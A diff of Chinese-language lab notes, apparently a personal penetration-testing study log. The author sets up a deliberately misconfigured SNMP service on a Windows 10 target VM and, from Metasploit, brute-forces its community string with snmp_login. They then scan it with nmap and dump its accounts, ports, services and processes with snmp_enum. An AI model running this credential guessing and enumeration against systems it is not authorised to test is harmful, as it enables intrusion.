@@ -359,4 +359,1788 @@ Auxiliary action:
 View the full module info with the info, or info -d command.
 
 msf6 auxiliary(sniffer/psnuffle) > run
-即可
+即可 并且本地的smb协议的也能嗅探到
+
+基于snmp协议收集主机信息
+我们先去win10靶子上安装一下这个服务
+Add-WindowsCapability -Online -Name "SNMP.Client~~~~0.0.1.0"
+
+PS C:\Windows\system32> Add-WindowsCapability -Online -Name "SNMP.Client~~~~0.0.1.0"                                    
+
+Path          :
+Online        : True
+RestartNeeded : False
+
+
+
+PS C:\Windows\system32> Get-WindowsCapability -Online -Name "SNMP*"
+
+
+Name         : SNMP.Client~~~~0.0.1.0
+State        : Installed
+DisplayName  : 简单网络管理协议 (SNMP)
+Description  : 此功能包括简单网络管理协议代理，这些代理用于监视网络设备中的活动并向网络控制台工作站报告
+DownloadSize : 595304
+InstallSize  : 2256266
+
+
+之后需要打开services.msc
+启用SNMP服务 进行不当的配置
+
+回到kali 这个模块有一个自己的密码本 先用那个
+┌──(root💀tyza66)-[~/aircrack_8812au]
+└─# msfdb run
+[i] Database already started
+Metasploit tip: View advanced module options with advanced
+                                                  
+                                   ____________
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
+ [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
+ [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
+ [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+ [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
+
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search snmp_login
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/snmp/snmp_login  .                normal  No     SNMP Community Login Scanner
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/snmp/snmp_login                                                                       
+
+msf6 > use 0
+msf6 auxiliary(scanner/snmp/snmp_login) > show options
+
+Module options (auxiliary/scanner/snmp/snmp_login):
+
+   Name              Current Setting       Required  Description
+   ----              ---------------       --------  -----------
+   ANONYMOUS_LOGIN   false                 yes       Attempt to login with a blank user
+                                                     name and password
+   BLANK_PASSWORDS   false                 no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                     yes       How fast to bruteforce, from 0 to
+                                                     5
+   DB_ALL_CREDS      false                 no        Try each user/password couple stor
+                                                     ed in the current database
+   DB_ALL_PASS       false                 no        Add all passwords in the current d
+                                                     atabase to the list
+   DB_ALL_USERS      false                 no        Add all users in the current datab
+                                                     ase to the list
+   DB_SKIP_EXISTING  none                  no        Skip existing credentials stored i
+                                                     n the current database (Accepted:
+                                                     none, user, user&realm)
+   PASSWORD                                no        The password to test
+   PASS_FILE         /usr/share/metasploi  no        File containing communities, one p
+                     t-framework/data/wor            er line
+                     dlists/snmp_default_
+                     pass.txt
+   PROTOCOL          udp                   yes       The SNMP protocol to use (Accepted
+                                                     : udp, tcp)
+   RHOSTS                                  yes       The target host(s), see https://do
+                                                     cs.metasploit.com/docs/using-metas
+                                                     ploit/basics/using-metasploit.html
+   RPORT             161                   yes       The target port
+   STOP_ON_SUCCESS   false                 yes       Stop guessing when a credential wo
+                                                     rks for a host
+   THREADS           1                     yes       The number of concurrent threads (
+                                                     max one per host)
+   USER_AS_PASS      false                 no        Try the username as the password f
+                                                     or all users
+   VERBOSE           true                  yes       Whether to print output for all at
+                                                     tempts
+   VERSION           1                     yes       The SNMP version to scan (Accepted
+                                                     : 1, 2c, all)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/snmp/snmp_login) > set RHOSTS 192.168.101.110
+RHOSTS => 192.168.101.110
+msf6 auxiliary(scanner/snmp/snmp_login) > set THREADS 20
+THREADS => 20
+msf6 auxiliary(scanner/snmp/snmp_login) > run
+
+[+] 192.168.101.110:161 - Login Successful: public (Access level: read-only); Proof (sysDescr.0): Hardware: Intel64 Family 6 Model 165 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 18362 Multiprocessor Free)
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+
+其实我们正常不应该直接run 而是先扫描服务有没有
+msf6 auxiliary(scanner/snmp/snmp_login) > db_nmap 192.168.101.110 -sU -p 161
+[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-17 08:54 CST
+[*] Nmap: Nmap scan report for 192.168.101.110
+[*] Nmap: Host is up (0.00042s latency).
+[*] Nmap: PORT    STATE SERVICE
+[*] Nmap: 161/udp open  snmp
+[*] Nmap: MAC Address: 00:0C:29:25:C6:31 (VMware)
+[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
+
+我们扫描了UDP 161端口 发现有服务存在
+
+之后我们可以根据找到的SNMP社区字符串扫描主机服务器信息
+msf6 auxiliary(scanner/snmp/snmp_login) > search snmp_enum
+
+Matching Modules
+================
+
+   #  Name                                          Disclosure Date  Rank    Check  Description
+   -  ----                                          ---------------  ----    -----  -----------
+   0  auxiliary/scanner/snmp/snmp_enum_hp_laserjet  .                normal  No     HP LaserJet Printer SNMP Enumeration
+   1  auxiliary/scanner/snmp/snmp_enum              .                normal  No     SNMP Enumeration Module
+   2  auxiliary/scanner/snmp/snmp_enumshares        .                normal  No     SNMP Windows SMB Share Enumeration
+   3  auxiliary/scanner/snmp/snmp_enumusers         .                normal  No     SNMP Windows Username Enumeration
+
+
+Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/snmp/snmp_enumusers
+
+msf6 auxiliary(scanner/snmp/snmp_login) > use 1
+msf6 auxiliary(scanner/snmp/snmp_enum) > show options
+
+Module options (auxiliary/scanner/snmp/snmp_enum):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   COMMUNITY  public           yes       SNMP Community String
+   RETRIES    1                yes       SNMP Retries
+   RHOSTS                      yes       The target host(s), see https://docs.metasploi
+                                         t.com/docs/using-metasploit/basics/using-metas
+                                         ploit.html
+   RPORT      161              yes       The target port (UDP)
+   THREADS    1                yes       The number of concurrent threads (max one per
+                                         host)
+   TIMEOUT    1                yes       SNMP Timeout
+   VERSION    1                yes       SNMP Version <1/2c>
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.101.110
+RHOSTS => 192.168.101.110
+msf6 auxiliary(scanner/snmp/snmp_enum) > set THREADS 20
+THREADS => 20
+msf6 auxiliary(scanner/snmp/snmp_enum) > run
+
+[-] 192.168.101.110 SNMP request timeout.
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.101.111
+RHOSTS => 192.168.101.111
+msf6 auxiliary(scanner/snmp/snmp_enum) > run
+
+[+] 192.168.101.111, Connected.
+
+[*] System information:
+
+Host IP                       : 192.168.101.111
+Hostname                      : DESKTOP-ASI6V22
+Description                   : Hardware: Intel64 Family 6 Model 165 Stepping 2 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 18362 Multiprocessor Free)
+Contact                       : root
+Location                      : ����
+Uptime snmp                   : 00:19:03.53
+Uptime system                 : 00:16:23.72
+System date                   : 2025-2-17 09:01:32.4
+
+[*] User accounts:
+
+["Guest"]           
+["admin"]           
+["tyza66"]          
+["Administrator"]   
+["DefaultAccount"]  
+["WDAGUtilityAccount"]
+
+[*] Network information:
+
+IP forwarding enabled         : no
+Default TTL                   : 128
+TCP segments received         : 11858
+TCP segments sent             : 10064
+TCP segments retrans          : 51
+Input datagrams               : 12361
+Delivered datagrams           : 12460
+Output datagrams              : 10347
+
+[*] Network interfaces:
+
+Interface                     : [ up ] Software Loopback Interface 1
+Id                            : 1
+Mac Address                   : :::::
+Type                          : softwareLoopback
+Speed                         : 1073 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ down ] Microsoft 6to4 Adapter
+Id                            : 2
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 0
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ down ] Microsoft IP-HTTPS Platform Adapter
+Id                            : 3
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 0
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (L2TP)
+Id                            : 4
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 1460
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (PPPOE)
+Id                            : 5
+Mac Address                   : :::::
+Type                          : ppp
+Speed                         : 0 Mbps
+MTU                           : 1494
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (IKEv2)
+Id                            : 6
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 1480
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (Network Monitor)
+Id                            : 7
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ down ] Microsoft Teredo Tunneling Adapter
+Id                            : 8
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 0
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (SSTP)
+Id                            : 9
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 4091
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (IP)
+Id                            : 10
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection
+Id                            : 11
+Mac Address                   : 00:0c:29:25:c6:31
+Type                          : ethernet-csmacd
+Speed                         : 1000 Mbps
+MTU                           : 1500
+In octets                     : 199230787
+Out octets                    : 1509781
+
+Interface                     : [ up ] WAN Miniport (IPv6)
+Id                            : 12
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ down ] Microsoft Kernel Debug Network Adapter
+Id                            : 13
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 0
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (PPTP)
+Id                            : 14
+Mac Address                   : :::::
+Type                          : unknown
+Speed                         : 0 Mbps
+MTU                           : 1464
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer LightWeight Filter-0000
+Id                            : 15
+Mac Address                   : 00:0c:29:25:c6:31
+Type                          : ethernet-csmacd
+Speed                         : 1000 Mbps
+MTU                           : 1500
+In octets                     : 199230787
+Out octets                    : 1509781
+
+Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-0000
+Id                            : 16
+Mac Address                   : 00:0c:29:25:c6:31
+Type                          : ethernet-csmacd
+Speed                         : 1000 Mbps
+MTU                           : 1500
+In octets                     : 199230787
+Out octets                    : 1509781
+
+Interface                     : [ up ] Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer LightWeight Filter-0000
+Id                            : 17
+Mac Address                   : 00:0c:29:25:c6:31
+Type                          : ethernet-csmacd
+Speed                         : 1000 Mbps
+MTU                           : 1500
+In octets                     : 199230787
+Out octets                    : 1509781
+
+Interface                     : [ up ] WAN Miniport (IP)-WFP Native MAC Layer LightWeight Filter-0000
+Id                            : 18
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (IP)-QoS Packet Scheduler-0000
+Id                            : 19
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (IPv6)-WFP Native MAC Layer LightWeight Filter-0000
+Id                            : 20
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (IPv6)-QoS Packet Scheduler-0000
+Id                            : 21
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (Network Monitor)-WFP Native MAC Layer LightWeight Filter-0000
+Id                            : 22
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+Interface                     : [ up ] WAN Miniport (Network Monitor)-QoS Packet Scheduler-0000
+Id                            : 23
+Mac Address                   : :::::
+Type                          : ethernet-csmacd
+Speed                         : 0 Mbps
+MTU                           : 1500
+In octets                     : 0
+Out octets                    : 0
+
+
+[*] Network IP:
+
+Id                  IP Address          Netmask             Broadcast           
+1                   127.0.0.1           255.0.0.0           1                   
+11                  192.168.101.111     255.255.255.0       1                   
+
+[*] Routing information:
+
+Destination         Next hop            Mask                Metric              
+0.0.0.0             192.168.101.1       0.0.0.0             25                  
+127.0.0.0           127.0.0.1           255.0.0.0           331                 
+127.0.0.1           127.0.0.1           255.255.255.255     331                 
+127.255.255.255     127.0.0.1           255.255.255.255     331                 
+192.168.101.0       192.168.101.111     255.255.255.0       281                 
+192.168.101.111     192.168.101.111     255.255.255.255     281                 
+192.168.101.255     192.168.101.111     255.255.255.255     281                 
+224.0.0.0           127.0.0.1           240.0.0.0           331                 
+255.255.255.255     127.0.0.1           255.255.255.255     331                 
+
+[*] TCP connections and listening ports:
+
+Local address       Local port          Remote address      Remote port         State               
+0.0.0.0             135                 0.0.0.0             0                   listen              
+0.0.0.0             445                 0.0.0.0             0                   listen              
+0.0.0.0             5040                0.0.0.0             0                   listen              
+0.0.0.0             5357                0.0.0.0             0                   listen              
+0.0.0.0             7680                0.0.0.0             0                   listen              
+0.0.0.0             49664               0.0.0.0             0                   listen              
+0.0.0.0             49665               0.0.0.0             0                   listen              
+0.0.0.0             49666               0.0.0.0             0                   listen              
+0.0.0.0             49667               0.0.0.0             0                   listen              
+0.0.0.0             49668               0.0.0.0             0                   listen              
+0.0.0.0             49671               0.0.0.0             0                   listen              
+192.168.101.111     139                 0.0.0.0             0                   listen              
+192.168.101.111     49853               20.198.162.76       443                 established         
+
+[*] Listening UDP ports:
+
+Local address       Local port          
+0.0.0.0             161                 
+0.0.0.0             500                 
+0.0.0.0             3702                
+0.0.0.0             4500                
+0.0.0.0             5050                
+0.0.0.0             5353                
+0.0.0.0             5355                
+0.0.0.0             49574               
+0.0.0.0             59695               
+127.0.0.1           1900                
+127.0.0.1           49317               
+127.0.0.1           59697               
+192.168.101.111     137                 
+192.168.101.111     138                 
+192.168.101.111     1900                
+192.168.101.111     49316               
+
+[*] Network services:
+
+Index               Name                
+0                   Power               
+1                   Server              
+2                   Themes              
+3                   SysMain             
+4                   IP Helper           
+5                   DNS Client          
+6                   DHCP Client         
+7                   SNMP 服务         
+8                   Time Broker         
+9                   Workstation         
+10                  User Manager        
+11                  VMware Tools        
+12                  CoreMessaging       
+13                  Plug and Play       
+14                  Print Spooler       
+15                  Windows Audio       
+16                  SSDP Discovery      
+17                  Task Scheduler      
+18                  Windows Search      
+19                  Windows Update      
+20                  Security Center     
+21                  Storage Service     
+22                  数据使用量     
+23                  CNG Key Isolation   
+24                  COM+ Event System   
+25                  Windows Event Log   
+26                  Credential Manager  
+27                  同步主机_334a1  
+28                  显示策略服务  
+29                  Group Policy Client 
+30                  RPC Endpoint Mapper 
+31                  Web 帐户管理器 
+32                  Network List Service
+33                  System Events Broker
+34                  User Profile Service
+35                  Base Filtering Engine
+36                  Delivery Optimization
+37                  Local Session Manager
+38                  TCP/IP NetBIOS Helper
+39                  Cryptographic Services
+40                  Diagnostic System Host
+41                  Application Information
+42                  COM+ System Application
+43                  Diagnostic Service Host
+44                  Shell Hardware Detection
+45                  State Repository Service
+46                  连接设备平台服务
+47                  Diagnostic Policy Service
+48                  Network Connection Broker
+49                  Security Accounts Manager
+50                  Windows Defender Firewall
+51                  Device Association Service
+52                  Network Location Awareness
+53                  VMware SVGA Helper Service
+54                  Windows Connection Manager
+55                  Windows Font Cache Service
+56                  Windows 安全中心服务
+57                  付款和 NFC/SE 管理器
+58                  更新 Orchestrator 服务
+59                  Remote Procedure Call (RPC)
+60                  剪贴板用户服务_334a1
+61                  DCOM Server Process Launcher
+62                  Microsoft Store 安装服务
+63                  Microsoft Defender Core 服务
+64                  Windows Audio Endpoint Builder
+65                  Network Store Interface Service
+66                  Distributed Link Tracking Client
+67                  Function Discovery Provider Host
+68                  Remote Access Connection Manager
+69                  Windows 推送通知系统服务
+70                  Windows 许可证管理器服务
+71                  AppX Deployment Service (AppXSVC)
+72                  System Event Notification Service
+73                  Windows Defender Antivirus Service
+74                  Windows Management Instrumentation
+75                  Distributed Transaction Coordinator
+76                  IKE and AuthIP IPsec Keying Modules
+77                  Network Connected Devices Auto-Setup
+78                  连接设备平台用户服务_334a1
+79                  System Guard 运行时监视器代理
+80                  Background Tasks Infrastructure Service
+81                  Function Discovery Resource Publication
+82                  Program Compatibility Assistant Service
+83                  VMware Alias Manager and Ticket Service
+84                  Connected User Experiences and Telemetry
+85                  Microsoft Windows SMS 路由器服务。
+86                  Secure Socket Tunneling Protocol Service
+87                  WinHTTP Web Proxy Auto-Discovery Service
+88                  Touch Keyboard and Handwriting Panel Service
+89                  Windows Push Notifications User Service_334a1
+90                  Windows Defender Antivirus Network Inspection Service
+
+[*] Share:
+
+ Name                         : Users
+  Path                        : C:\Users
+  Comment                     : 
+
+
+[*] Storage information:
+
+Description                   : ["C:\\ Label:  Serial Number d41aca37"]
+Device id                     : [#<SNMP::Integer:0x00007f39e4c1a898 @value=1>]
+Filesystem type               : ["Fixed Disk"]
+Device unit                   : [#<SNMP::Integer:0x00007f39e4c1fa78 @value=4096>]
+Memory size                   : 59.68 GB
+Memory used                   : 19.71 GB
+
+Description                   : ["D:\\"]
+Device id                     : [#<SNMP::Integer:0x00007f39e4c25860 @value=2>]
+Filesystem type               : ["Compact Disc"]
+Device unit                   : [#<SNMP::Integer:0x00007f39e4bc0410 @value=0>]
+Memory size                   : 0 bytes
+Memory used                   : 0 bytes
+
+Description                   : ["Virtual Memory"]
+Device id                     : [#<SNMP::Integer:0x00007f39e4bd00b8 @value=3>]
+Filesystem type               : ["Virtual Memory"]
+Device unit                   : [#<SNMP::Integer:0x00007f39e4bdbf08 @value=65536>]
+Memory size                   : 5.37 GB
+Memory used                   : 1.83 GB
+
+Description                   : ["Physical Memory"]
+Device id                     : [#<SNMP::Integer:0x00007f39e4be7308 @value=4>]
+Filesystem type               : ["Ram"]
+Device unit                   : [#<SNMP::Integer:0x00007f39e4be40e0 @value=65536>]
+Memory size                   : 4.00 GB
+Memory used                   : 1.93 GB
+
+
+[*] File system information:
+
+Index                         : 1
+Mount point                   : 
+Remote mount point            : -
+Type                          : Unknown
+Access                        : 1
+Bootable                      : 0
+
+[*] Device information:
+
+Id                  Type                Status              Descr               
+1                   Printer             running             Microsoft XPS Document Writer v4
+2                   Printer             running             Microsoft Print To PDF
+3                   Printer             running             Microsoft Shared Fax Driver
+4                   Processor           running             Unknown Processor Type
+5                   Processor           running             Unknown Processor Type
+6                   Network             unknown             Software Loopback Interface 1
+7                   Network             unknown             Microsoft 6to4 Adapter
+8                   Network             unknown             Microsoft IP-HTTPS Platform Adapter
+9                   Network             unknown             WAN Miniport (L2TP) 
+10                  Network             unknown             WAN Miniport (PPPOE)
+11                  Network             unknown             WAN Miniport (IKEv2)
+12                  Network             unknown             WAN Miniport (Network Monitor)
+13                  Network             unknown             Microsoft Teredo Tunneling Adapter
+14                  Network             unknown             WAN Miniport (SSTP) 
+15                  Network             unknown             WAN Miniport (IP)   
+16                  Network             unknown             Intel(R) 82574L Gigabit Network Connection
+17                  Network             unknown             WAN Miniport (IPv6) 
+18                  Network             unknown             Microsoft Kernel Debug Network Adapter
+19                  Network             unknown             WAN Miniport (PPTP) 
+20                  Network             unknown             Intel(R) 82574L Gigabit Network Connection-WFP Native MAC Layer
+21                  Network             unknown             Intel(R) 82574L Gigabit Network Connection-QoS Packet Scheduler-
+22                  Network             unknown             Intel(R) 82574L Gigabit Network Connection-WFP 802.3 MAC Layer L
+23                  Network             unknown             WAN Miniport (IP)-WFP Native MAC Layer LightWeight Filter-0000
+24                  Network             unknown             WAN Miniport (IP)-QoS Packet Scheduler-0000
+25                  Network             unknown             WAN Miniport (IPv6)-WFP Native MAC Layer LightWeight Filter-0000
+26                  Network             unknown             WAN Miniport (IPv6)-QoS Packet Scheduler-0000
+27                  Network             unknown             WAN Miniport (Network Monitor)-WFP Native MAC Layer LightWeight
+28                  Network             unknown             WAN Miniport (Network Monitor)-QoS Packet Scheduler-0000
+29                  Disk Storage        unknown             D:\                 
+30                  Disk Storage        running             Fixed Disk          
+31                  Keyboard            running             IBM enhanced (101- or 102-key) keyboard, Subtype=(0)
+
+[*] Software components:
+
+Index               Name                
+1                   Microsoft Visual C++ 2022 X64 Additional Runtime - 14.36.32532
+2                   VMware Tools        
+3                   Microsoft Visual C++ 2022 X64 Minimum Runtime - 14.36.32532
+4                   Microsoft Visual C++ 2015-2022 Redistributable (x86) - 14.36.325
+5                   Microsoft Visual C++ 2022 X86 Minimum Runtime - 14.36.32532
+6                   Microsoft Visual C++ 2015-2022 Redistributable (x64) - 14.36.325
+7                   Microsoft Visual C++ 2022 X86 Additional Runtime - 14.36.32532
+
+[*] Processes:
+
+Id                  Status              Name                Path                Parameters          
+1                   running             System Idle Process                                         
+4                   running             System                                                      
+88                  running             Registry                                                    
+288                 running             smss.exe                                                    
+324                 running             svchost.exe         C:\Windows\System32\-k LocalService -p -s LicenseManager
+332                 running             svchost.exe         C:\Windows\system32\-k LocalServiceNetworkRestricted -p -s SmsRouter
+356                 running             svchost.exe         C:\Windows\system32\-k LocalServiceNoNetwork -p
+404                 running             csrss.exe                                                   
+476                 running             wininit.exe                                                 
+484                 running             csrss.exe                                                   
+544                 running             winlogon.exe                                                
+612                 running             services.exe                                                
+624                 running             svchost.exe         C:\Windows\system32\-k UnistackSvcGroup -s WpnUserService
+632                 running             lsass.exe           C:\Windows\system32\                    
+732                 running             svchost.exe         C:\Windows\system32\-k DcomLaunch -p -s PlugPlay
+756                 running             fontdrvhost.exe                                             
+764                 running             fontdrvhost.exe                                             
+776                 running             svchost.exe         C:\Windows\system32\-k DcomLaunch -p    
+792                 running             snmp.exe            C:\Windows\System32\                    
+868                 running             svchost.exe         C:\Windows\system32\-k RPCSS -p         
+916                 running             svchost.exe         C:\Windows\System32\-k LocalServiceNetworkRestricted -p -s lmhosts
+920                 running             svchost.exe         C:\Windows\system32\-k DcomLaunch -p -s LSM
+988                 running             dwm.exe                                                     
+1108                running             svchost.exe         C:\Windows\System32\-k LocalServiceNetworkRestricted -p -s EventLog
+1124                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s Schedule
+1136                running             svchost.exe         C:\Windows\System32\-k LocalSystemNetworkRestricted -p -s NcbService
+1144                running             svchost.exe         C:\Windows\system32\-k LocalServiceNetworkRestricted -p -s TimeBrokerSvc
+1208                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s ProfSvc
+1268                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s UsoSvc
+1288                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s DispBrokerDesktopSvc
+1304                running             conhost.exe         \??\C:\Windows\system32\0x4                 
+1316                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s nsi
+1384                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s UserManager
+1420                running             svchost.exe         C:\Windows\system32\-k LocalServiceNetworkRestricted -p -s Dhcp
+1520                running             cmd.exe             C:\Windows\system32\                    
+1524                running             svchost.exe         C:\Windows\System32\-k NetworkService -p -s NlaSvc
+1552                running             svchost.exe         C:\Windows\system32\-k NetworkService -p -s Dnscache
+1560                running             svchost.exe         C:\Windows\System32\-k LocalServiceNetworkRestricted -p
+1664                running             svchost.exe         C:\Windows\system32\-k LocalSystemNetworkRestricted -p -s SysMain
+1672                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s EventSystem
+1684                running             svchost.exe         C:\Windows\System32\-k netsvcs -p -s Themes
+1748                running             Memory Compression                                          
+1792                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s SENS
+1820                running             svchost.exe         C:\Windows\System32\-k LocalService -p -s netprofm
+1832                running             svchost.exe         C:\Windows\System32\-k LocalSystemNetworkRestricted -p -s AudioEndpointBuilder
+1844                running             svchost.exe         C:\Windows\system32\-k LocalService -p  
+1852                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s FontCache
+1916                running             svchost.exe         C:\Windows\system32\-k LocalServiceNetworkRestricted -p -s WinHttpAutoProxySvc
+1988                running             svchost.exe         C:\Windows\system32\-k LocalServiceNetworkRestricted -p
+2028                running             svchost.exe         C:\Windows\System32\-k LocalServiceNetworkRestricted -p
+2116                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s WpnService
+2120                running             svchost.exe         C:\Windows\System32\-k netsvcs -p -s ShellHWDetection
+2144                running             svchost.exe         C:\Windows\system32\-k appmodel -p -s StateRepository
+2164                running             NisSrv.exe                                                  
+2192                running             svchost.exe         C:\Windows\System32\-k LocalServiceNoNetwork -p -s NcdAutoSetup
+2232                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s fdPHost
+2312                running             spoolsv.exe         C:\Windows\System32\                    
+2356                running             RuntimeBroker.exe   C:\Windows\System32\-Embedding          
+2396                running             svchost.exe         C:\Windows\system32\-k LocalServiceNoNetworkFirewall -p
+2424                running             svchost.exe         C:\Windows\system32\-k LocalServiceAndNoImpersonation -p -s FDResPub
+2468                running             svchost.exe         C:\Windows\System32\-k NetworkService -p -s LanmanWorkstation
+2540                running             svchost.exe         C:\Windows\System32\-k LocalSystemNetworkRestricted -p -s WdiSystemHost
+2596                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s Winmgmt
+2624                running             svchost.exe                                                 
+2704                running             svchost.exe         C:\Windows\system32\-k LocalSystemNetworkRestricted -p -s DeviceAssociationService
+2720                running             svchost.exe         C:\Windows\system32\-k NetworkService -p -s CryptSvc
+2728                running             svchost.exe         C:\Windows\System32\-k utcsvc -p        
+2760                running             svchost.exe         C:\Windows\System32\-k LocalServiceNoNetwork -p -s DPS
+2788                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s IKEEXT
+2820                running             svchost.exe         C:\Windows\System32\-k NetSvcs -p -s iphlpsvc
+2904                running             svchost.exe         C:\Windows\system32\-k netsvcs -p -s LanmanServer
+2960                running             svchost.exe         C:\Windows\system32\-k LocalService -p -s SstpSvc
+2976                running             vmtoolsd.exe        C:\Program Files\VMware\VMware Tools\                    
+2984                running             svchost.exe         C:\Windows\System32\-k LocalSystemNetworkRestricted -p -s TrkWks
+2992                running             vm3dservice.exe     C:\Windows\system32\                    
+3000                running             VGAuthService.exe   C:\Program Files\VMware\VMware Tools\VMware VGAuth\                    
+3040                running             dasHost.exe                             {b70a3fde-5957-49d5-9e6e5aa7939e22c8}
+3080                running             svchost.exe         C:\Windows\System32\-k LocalService -p -s WdiServiceHost
+3192                running             vm3dservice.exe     C:\Windows\system32\-n                  
+3476                running             svchost.exe         C:\Windows\System32\-k netsvcs          
+3860                running             svchost.exe         C:\Windows\system32\-k LocalServiceAndNoImpersonation -p -s SSDPSRV
+3892                running             dllhost.exe         C:\Windows\system32\/Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
+4008                running             sihost.exe                                                  
+4024                running             WmiPrvSE.exe        C:\Windows\system32\wbem\                    
+4080                running             svchost.exe         C:\Windows\system32\-k UnistackSvcGroup -s CDPUserSvc
+4128                running             svchost.exe         C:\Windows\System32\-k netsvcs -p       
+4156                running             taskhostw.exe                           {222A245B-E637-4AE9-A93F-A59CA119A75E}
